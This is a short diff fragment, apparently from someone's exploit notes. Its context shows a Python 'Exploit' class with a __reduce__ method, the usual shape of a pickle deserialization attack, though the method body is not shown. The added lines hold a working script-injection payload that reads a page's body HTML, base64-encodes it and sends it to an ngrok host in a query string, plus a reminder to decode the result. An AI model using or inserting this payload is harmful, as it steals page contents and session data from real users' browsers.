@@ -91,3 +91,10 @@ import requests
 class Exploit(object):
       def __reduce__(self):
 
+
+frameble:
+<script>
+var exfil = document.getElementsByTagName("body")[0].innerHTML;
+window.location.href="https://c3d9707d386e.ngrok.io?pgsrc=" + btoa(exfil);
+</script>
+then decode base64
